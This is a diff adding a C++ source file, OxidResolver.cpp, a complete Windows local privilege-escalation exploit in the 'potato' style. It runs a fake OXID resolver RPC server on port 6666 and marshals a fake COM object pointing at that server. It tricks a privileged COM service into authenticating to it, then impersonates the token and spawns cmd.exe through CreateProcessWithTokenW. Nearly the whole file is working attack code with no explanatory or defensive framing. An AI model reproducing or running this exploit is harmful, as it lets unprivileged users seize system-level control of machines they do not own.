@@ -1,0 +1,550 @@
+// OxidResolver.cpp : Defines the entry point for the console application.
+//
+
+#pragma once
+
+//#include "targetver.h"
+
+#define RPC_USE_NATIVE_WCHAR
+
+#include <stdio.h>
+#include <tchar.h>
+#include <windows.h>
+#include "resolver_h.h"
+
+//#include <comdef.h>
+
+#pragma comment(lib, "rpcrt4.lib")
+
+void DebugLog(const char* message) {
+	OutputDebugString(message);
+	//MessageBox(0, message, "Debug!", 0);
+};
+
+void DebugLog(const wchar_t* message) {
+	OutputDebugStringW(message);
+	//MessageBoxW(0, message, L"Debug!", 0);
+};
+
+
+extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
+{
+	return(HeapAlloc(GetProcessHeap(), 0, len));
+}
+
+extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
+{
+	HeapFree(GetProcessHeap(), 0, ptr);
+}
+
+extern "C" /* [idempotent] */ error_status_t ResolveOxid(
+	/* [in] */ handle_t hRpc,
+	/* [in] */ OXID *pOxid,
+	/* [in] */ unsigned short cRequestedProtseqs,
+	/* [size_is][ref][in] */ unsigned short arRequestedProtseqs[],
+	/* [ref][out] */ DUALSTRINGARRAY **ppdsaOxidBindings,
+	/* [ref][out] */ IPID *pipidRemUnknown,
+	/* [ref][out] */ DWORD *pAuthnHint)
+{
+	return E_FAIL;
+}
+
+extern "C" /* [idempotent] */ error_status_t SimplePing(
+	/* [in] */ handle_t hRpc,
+	/* [in] */ SETID *pSetId)
+{
+	return S_OK;
+}
+
+extern "C" /* [idempotent] */ error_status_t ComplexPing(
+	/* [in] */ handle_t hRpc,
+	/* [out][in] */ SETID *pSetId,
+	/* [in] */ unsigned short SequenceNum,
+	/* [in] */ unsigned short cAddToSet,
+	/* [in] */ unsigned short cDelFromSet,
+	/* [size_is][unique][in] */ OID AddToSet[],
+	/* [size_is][unique][in] */ OID DelFromSet[],
+	/* [out] */ unsigned short *pPingBackoffFactor)
+{
+	DebugLog("ComplexPing\n");
+	return E_FAIL;
+}
+
+extern "C" /* [idempotent] */ error_status_t ServerAlive(
+	/* [in] */ handle_t hRpc)
+{
+	DebugLog("ServerAlive\n");
+	return S_OK;
+}
+
+extern "C" /* [idempotent] */ error_status_t ResolveOxid2(
+	/* [in] */ handle_t hRpc,
+	/* [in] */ OXID *pOxid,
+	/* [in] */ unsigned short cRequestedProtseqs,
+	/* [size_is][ref][in] */ unsigned short arRequestedProtseqs[],
+	/* [ref][out] */ DUALSTRINGARRAY **ppdsaOxidBindings,
+	/* [ref][out] */ IPID *pipidRemUnknown,
+	/* [ref][out] */ DWORD *pAuthnHint,
+	/* [ref][out] */ COMVERSION *pComVersion)
+{
+
+	DebugLog("ResolveOxid2\n");
+	return E_FAIL;
+}
+
+extern "C" /* [idempotent] */ error_status_t ServerAlive2(
+	/* [in] */ handle_t hRpc,
+	/* [ref][out] */ COMVERSION *pComVersion,
+	/* [ref][out] */ DUALSTRINGARRAY **ppdsaOrBindings,
+	/* [ref][out] */ DWORD *pReserved)
+{
+	DebugLog("ServerAlive2\n");
+	return E_FAIL;
+}
+
+HRESULT WriteData(IStream* stm, const void* data, int len)
+{
+	return stm->Write(data, len, nullptr);
+}
+
+void do_error(RPC_STATUS status)
+{
+	DebugLog("Error. ");
+	ExitProcess(1);
+}
+
+LPWSTR g_cmdline;
+
+RPC_STATUS CALLBACK SecurityCallback(
+	_In_ RPC_IF_HANDLE Interface,
+	_In_ void          *Context
+)
+{
+	DebugLog("Callback\n");
+	if (g_cmdline && RpcImpersonateClient(Context) == RPC_S_OK)
+	{
+		DebugLog("Impersonated: ..."); // %d\n", GetCurrentThreadId());
+
+		HANDLE hToken;
+		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken)) {
+			DebugLog("OpenThreadToken failed");
+			/*
+			DWORD err = GetLastError();
+			char buf[200];
+			wsprintf(buf, "GetLastError returns %08.08lx", err);
+			DebugLog(buf);
+			return RPC_S_OK;*/
+		}
+		STARTUPINFOW start_info = {};
+		start_info.cb = sizeof(start_info);
+		start_info.lpDesktop = L"Service-0x0-3e7$\\Default";
+		PROCESS_INFORMATION proc_info = {};
+
+		//DebugLog("About to issue");
+		//MessageBoxW(0, g_cmdline, g_cmdline, 0);
+		g_cmdline = L"C:\\Windows\\System32\\cmd.exe";
+		//MessageBoxW(0, g_cmdline, g_cmdline, 0);
+
+		bool result = CreateProcessWithTokenW(hToken, 0, nullptr, g_cmdline, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info);
+		if (!result) {
+			DebugLog("CreateProcessWithTokenW fails");
+			/*DWORD err = GetLastError();
+			char buf[200];
+			wsprintf(buf, "GetLastError returns %08.08lx", err);
+			DebugLog(buf);
+			return RPC_S_OK;*/
+		}
+		else {
+			DebugLog("CreateProcessWithTokenW success");
+		}
+		RpcRevertToSelf();
+		ExitProcess(0);
+	}
+	return RPC_S_OK;
+}
+
+unsigned char marshal_data[112] = {
+	0x4D, 0x45, 0x4F, 0x57, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
+	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0xB2, 0x01, 0x5E,
+	0x8A, 0xB9, 0x70, 0xB9, 0x7C, 0x32, 0xA4, 0xE5, 0x53, 0xF6, 0x3D, 0xC9,
+	0x79, 0xB5, 0x87, 0x56, 0x45, 0xDC, 0x12, 0x49, 0x20, 0xE5, 0x91, 0x55,
+	0x26, 0x06, 0x28, 0x0E, 0x16, 0x00, 0x12, 0x00, 0x07, 0x00, 0x31, 0x00,
+	0x32, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00,
+	0x2E, 0x00, 0x31, 0x00, 0x5B, 0x00, 0x36, 0x00, 0x36, 0x00, 0x36, 0x00,
+	0x36, 0x00, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0xFF, 0xFF,
+	0x00, 0x00, 0x00, 0x00
+};
+
+
+class FakeComObject : public IMarshal, public IStorage
+{
+private:
+	ULONG _ref_count;
+	IStorage* _stg;
+
+public:
+
+	FakeComObject(IStorage* stg) 
+		: _ref_count(1), _stg(stg)
+	{
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
+		/* [in] */ REFIID riid,
+		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject) {
+		*ppvObject = nullptr;
+
+		if (IsEqualIID(riid, IID_IUnknown))
+		{
+			*ppvObject = this;
+		}
+		else if (IsEqualIID(riid, IID_IMarshal))
+		{
+			*ppvObject = static_cast<IMarshal*>(this);
+		}
+		else if (IsEqualIID(riid, IID_IStorage))
+		{
+			*ppvObject = static_cast<IStorage*>(this);
+		}
+		else
+		{
+			return E_NOINTERFACE;
+		}
+
+		static_cast<IUnknown*>(*ppvObject)->AddRef();
+		return S_OK;
+	}
+
+	virtual ULONG STDMETHODCALLTYPE AddRef(void) {
+		return InterlockedIncrement(&_ref_count);
+	}
+
+	virtual ULONG STDMETHODCALLTYPE Release(void) {
+		ULONG value = InterlockedDecrement(&_ref_count);
+		if (value == 0)
+		{
+			delete this;
+		}
+		return value;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][unique][in] */
+		_In_opt_  void *pv,
+		/* [annotation][in] */
+		_In_  DWORD dwDestContext,
+		/* [annotation][unique][in] */
+		_Reserved_  void *pvDestContext,
+		/* [annotation][in] */
+		_In_  DWORD mshlflags,
+		/* [annotation][out] */
+		_Out_  CLSID *pCid)
+	{
+		return IIDFromString(L"{00000306-0000-0000-c000-000000000046}", pCid);
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][unique][in] */
+		_In_opt_  void *pv,
+		/* [annotation][in] */
+		_In_  DWORD dwDestContext,
+		/* [annotation][unique][in] */
+		_Reserved_  void *pvDestContext,
+		/* [annotation][in] */
+		_In_  DWORD mshlflags,
+		/* [annotation][out] */
+		_Out_  DWORD *pSize)
+	{
+		*pSize = 1024;
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
+		/* [annotation][unique][in] */
+		_In_  IStream *pStm,
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][unique][in] */
+		_In_opt_  void *pv,
+		/* [annotation][in] */
+		_In_  DWORD dwDestContext,
+		/* [annotation][unique][in] */
+		_Reserved_  void *pvDestContext,
+		/* [annotation][in] */
+		_In_  DWORD mshlflags)
+	{
+		return WriteData(pStm, marshal_data, sizeof(marshal_data));
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
+		/* [annotation][unique][in] */
+		_In_  IStream *pStm,
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][out] */
+		_Outptr_  void **ppv)
+	{
+		return E_FAIL;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
+		/* [annotation][unique][in] */
+		_In_  IStream *pStm)
+	{
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
+		/* [annotation][in] */
+		_In_  DWORD dwReserved)
+	{
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE CreateStream(
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName,
+		/* [in] */ DWORD grfMode,
+		/* [in] */ DWORD reserved1,
+		/* [in] */ DWORD reserved2,
+		/* [out] */ __RPC__deref_out_opt IStream **ppstm)
+	{ 
+		return _stg->CreateStream(pwcsName, grfMode, reserved1, reserved2, ppstm);
+	}
+
+	virtual /* [local] */ HRESULT STDMETHODCALLTYPE OpenStream(
+		/* [annotation][string][in] */
+		_In_z_  const OLECHAR *pwcsName,
+		/* [annotation][unique][in] */
+		_Reserved_  void *reserved1,
+		/* [in] */ DWORD grfMode,
+		/* [in] */ DWORD reserved2,
+		/* [annotation][out] */
+		_Outptr_  IStream **ppstm) {
+		return _stg->OpenStream(pwcsName, reserved1, grfMode, reserved2, ppstm);
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE CreateStorage(
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName,
+		/* [in] */ DWORD grfMode,
+		/* [in] */ DWORD reserved1,
+		/* [in] */ DWORD reserved2,
+		/* [out] */ __RPC__deref_out_opt IStorage **ppstg){ return _stg->CreateStorage(pwcsName, grfMode, reserved1, reserved2, ppstg); }
+
+	virtual HRESULT STDMETHODCALLTYPE OpenStorage(
+		/* [string][unique][in] */ __RPC__in_opt_string const OLECHAR *pwcsName,
+		/* [unique][in] */ __RPC__in_opt IStorage *pstgPriority,
+		/* [in] */ DWORD grfMode,
+		/* [unique][in] */ __RPC__deref_opt_in_opt SNB snbExclude,
+		/* [in] */ DWORD reserved,
+		/* [out] */ __RPC__deref_out_opt IStorage **ppstg){ return _stg->OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, ppstg); }
+
+	virtual /* [local] */ HRESULT STDMETHODCALLTYPE CopyTo(
+		/* [in] */ DWORD ciidExclude,
+		/* [annotation][size_is][unique][in] */
+		_In_reads_opt_(ciidExclude)  const IID *rgiidExclude,
+		/* [annotation][unique][in] */
+		_In_opt_  SNB snbExclude,
+		/* [annotation][unique][in] */
+		_In_  IStorage *pstgDest){ return _stg->CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest); }
+
+	virtual HRESULT STDMETHODCALLTYPE MoveElementTo(
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName,
+		/* [unique][in] */ __RPC__in_opt IStorage *pstgDest,
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsNewName,
+		/* [in] */ DWORD grfFlags){ return _stg->MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags); }
+
+	virtual HRESULT STDMETHODCALLTYPE Commit(
+		/* [in] */ DWORD grfCommitFlags){ return _stg->Commit(grfCommitFlags); }
+
+	virtual HRESULT STDMETHODCALLTYPE Revert(void){ return E_FAIL; }
+
+	virtual /* [local] */ HRESULT STDMETHODCALLTYPE EnumElements(
+		/* [annotation][in] */
+		_Reserved_  DWORD reserved1,
+		/* [annotation][size_is][unique][in] */
+		_Reserved_  void *reserved2,
+		/* [annotation][in] */
+		_Reserved_  DWORD reserved3,
+		/* [annotation][out] */
+		_Outptr_  IEnumSTATSTG **ppenum){ return _stg->EnumElements(reserved1, reserved2, reserved3, ppenum); }
+
+	virtual HRESULT STDMETHODCALLTYPE DestroyElement(
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName){ return _stg->DestroyElement(pwcsName); }
+
+	virtual HRESULT STDMETHODCALLTYPE RenameElement(
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsOldName,
+		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsNewName){ return _stg->RenameElement(pwcsOldName, pwcsNewName); }
+
+	virtual HRESULT STDMETHODCALLTYPE SetElementTimes(
+		/* [string][unique][in] */ __RPC__in_opt_string const OLECHAR *pwcsName,
+		/* [unique][in] */ __RPC__in_opt const FILETIME *pctime,
+		/* [unique][in] */ __RPC__in_opt const FILETIME *patime,
+		/* [unique][in] */ __RPC__in_opt const FILETIME *pmtime){ return _stg->SetElementTimes(pwcsName, pctime, patime, pmtime); }
+
+	virtual HRESULT STDMETHODCALLTYPE SetClass(
+		/* [in] */ __RPC__in REFCLSID clsid){ return _stg->SetClass(clsid); }
+
+	virtual HRESULT STDMETHODCALLTYPE SetStateBits(
+		/* [in] */ DWORD grfStateBits,
+		/* [in] */ DWORD grfMask){ return _stg->SetStateBits(grfStateBits, grfMask); }
+
+	virtual HRESULT STDMETHODCALLTYPE Stat(
+		/* [out] */ __RPC__out STATSTG *pstatstg,
+		/* [in] */ DWORD grfStatFlag)
+	{ 
+		
+		HRESULT hr = _stg->Stat(pstatstg, grfStatFlag); 
+		if (SUCCEEDED(hr))
+		{
+			LPVOID buf = CoTaskMemAlloc(4);
+			CopyMemory(buf, L"a\0", 4);
+
+			pstatstg->pwcsName = (LPOLESTR)buf;
+		}
+		return hr;
+	}
+};
+
+void Check(HRESULT hr)
+{
+	if (FAILED(hr))
+	{
+		DebugLog("Check failed!\n");
+	}
+}
+
+DWORD CALLBACK CallIntoCom(LPVOID event)
+{
+	WaitForSingleObject(nullptr, INFINITE);
+
+	CoInitialize(nullptr);
+
+	DebugLog("Starting COM client\n");
+
+	ILockBytes* lb;
+	Check(CreateILockBytesOnHGlobal(nullptr, TRUE, &lb));
+	IStorage* stg;
+	Check(StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg));
+	IStorage* fake = new FakeComObject(stg);
+
+	CLSID clsid;
+	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &clsid);
+
+	MULTI_QI qis[1] = {};
+
+	qis[0].pIID = &IID_IUnknown;
+
+	DebugLog("About to launch CoGetInstanceFromIStorage\n");
+	CoGetInstanceFromIStorage(nullptr, &clsid, nullptr, CLSCTX_LOCAL_SERVER, fake, 1, qis);
+	DebugLog("COM client done\n");
+
+	return 0;
+}
+
+int _WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
+	int wchars_num = MultiByteToWideChar(CP_UTF8, 0, lpCmdLine, -1, NULL, 0);
+	wchar_t* wstr = (wchar_t*) HeapAlloc(GetProcessHeap(), 0, wchars_num * 2 + 4);
+	MultiByteToWideChar(CP_UTF8, 0, lpCmdLine, -1, wstr, wchars_num);
+
+	g_cmdline = wstr;
+
+	HANDLE ev = CreateEvent(nullptr, FALSE, FALSE, nullptr);
+	CreateThread(nullptr, 0, CallIntoCom, ev, 0, nullptr);
+
+	RPC_STATUS status;
+	wchar_t * pszProtocolSequence = L"ncacn_ip_tcp";
+	wchar_t * pszSecurity = NULL;
+	wchar_t * pszEndpoint = L"6666";
+	unsigned int  cMinCalls = 1;
+	unsigned int  fDontWait = FALSE;
+
+	RpcServerRegisterAuthInfo(nullptr, RPC_C_AUTHN_WINNT, nullptr, nullptr);
+
+	status = RpcServerUseProtseqEpW(
+		pszProtocolSequence,
+		RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
+		pszEndpoint,
+		pszSecurity);
+
+	if (status) do_error(status);
+
+	status = RpcServerRegisterIf2(IObjectExporter_v0_0_s_ifspec,
+		NULL,
+		NULL,
+		RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH | RPC_IF_SEC_NO_CACHE,
+		RPC_C_LISTEN_MAX_CALLS_DEFAULT,
+		-1, 
+		SecurityCallback);
+
+	if (status) do_error(status);
+
+	status = RpcServerListen(cMinCalls,
+		RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
+		TRUE);
+
+	if (status) do_error(status);
+
+	SetEvent(ev);
+
+	status = RpcMgmtWaitServerListen();
+	if (status) do_error(status);
+
+    return 0;
+}
+
+void* memcpy(void* dest, const void* source, size_t length) {
+	char* foo = (char*)dest;
+	char* src = (char*)source;
+	for (int i = 0; i < length; ++i) {
+		foo[i] = src[i];
+	}
+	return dest;
+}
+
+int memcmp(const void* s1A, const void* s2A, size_t n) {
+	unsigned char u1, u2;
+	const unsigned char* s1 = (const unsigned char*)s1A;
+	const unsigned char* s2 = (const unsigned char*)s2A;
+
+	for (; n--; s1++, s2++) {
+		u1 = *(unsigned char *)s1;
+		u2 = *(unsigned char *)s2;
+		if (u1 != u2) {
+			return (u1 - u2);
+		}
+	}
+	return 0;
+}
+
+void* memset(void* ptr, int value, size_t num) {
+	char* foo = (char*)ptr;
+	for (int i = 0; i < num; ++i) {
+		foo[i] = value;
+	}
+	return ptr;
+}
+
+extern "C" DWORD __CxxFrameHandler3(
+	PEXCEPTION_RECORD rec,
+	EXCEPTION_REGISTRATION_RECORD* ExceptionRegistrationFrame,
+	PCONTEXT context,
+	EXCEPTION_REGISTRATION_RECORD** _ExceptionRecord) {
+	DebugBreak();
+	return 0;
+}
+
+void * operator new(size_t n) {
+	return(HeapAlloc(GetProcessHeap(), 0, n));
+}
+
+void __cdecl operator delete(void * p, size_t sz) {
+	return;
+	// TODO(thomasdullien): Be slightly less ghetto.
+	//HeapFree(GetProcessHeap(), 0, p);
+}
+
